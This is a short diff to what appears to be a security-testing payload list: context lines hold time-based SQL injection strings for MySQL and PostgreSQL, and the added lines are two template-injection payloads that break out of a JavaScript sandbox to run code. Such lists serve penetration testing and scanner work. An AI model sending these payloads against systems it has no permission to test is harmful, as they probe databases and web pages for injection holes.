@@ -305,3 +305,5 @@ benchmark(15000000,md5(0x4e446b6e))-9999
 9999'||(select 99999999 from pg_sleep(15))||'9999
 9999"||(select 99999999 from pg_sleep(15))||"9999
 
+{{this.constructor.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
